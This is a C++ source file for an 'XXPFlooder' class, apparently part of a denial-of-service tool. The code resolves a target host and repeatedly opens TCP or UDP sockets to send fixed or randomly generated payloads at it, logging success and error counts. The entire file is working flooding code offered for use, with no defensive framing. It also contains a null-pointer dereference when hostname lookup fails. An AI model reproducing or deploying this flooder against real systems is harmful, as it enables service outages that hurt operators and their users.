#include "xxpflooder.h"

#include "util.h"

#include <string.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <unistd.h>
#include <stdio.h>

XXPFlooder::XXPFlooder(int fid, const char *ip, int port, int delay, const char *host, int protocol, const char *data, bool random)
	: IFlooder(fid, ip, port, delay)
	, pData(data)
	, pHost(host)
	, pRandomData()
	, iDataSize(0)
	, iProtocol(protocol)
	, sAddress()
	, bRandom(random)
{
	memset(&sAddress, '\0', sizeof(sAddress));
	sAddress.sin_family = AF_INET;
	sAddress.sin_port = htons(port);

	if (!pIp)
	{
		struct hostent *he = gethostbyname(host);
		if (he == NULL)
			bRunning = false;

		in_addr *addr = (in_addr *)he->h_addr;
		pIp = inet_ntoa(*addr); // don't care about the data, will not use it anymore
	}
	sAddress.sin_addr.s_addr = inet_addr(pIp);
}

XXPFlooder::~XXPFlooder()
{
}

bool XXPFlooder::Run()
{
	if (Thread::Run())
	{
		if (bRandom)
		{
			memset(pRandomData, '\0', sizeof(pRandomData));
			for (int i = 0; i < XXP_RANDOM_DATA_SIZE_MAX; i++)
			{
				pRandomData[i] = get_random_valid_char();
			}
			pRandomData[XXP_RANDOM_DATA_SIZE_MAX] = '\0';

			pData = pRandomData;
		}

		if (pData)
			iDataSize = strlen(pData);

		int sock = socket(AF_INET, iProtocol ? SOCK_DGRAM : SOCK_STREAM, 0);
		if (sock >= 0)
		{
			// keep trying to connect
			while (connect(sock, (struct sockaddr *)&sAddress, sizeof(sAddress)) < 0);

			if (sendto(sock, pData, iDataSize, 0, (struct sockaddr *)&sAddress, sizeof(sAddress)) > 0)
				iCount++;
			else
				iError++;


			fprintf(stdout, "[%d] %d|%d\n", iId, iCount, iError);
			usleep(iDelay * 1000);
			close(sock);
		}
		else
		{
			iError++;
		}
	}

	return bRunning;
}
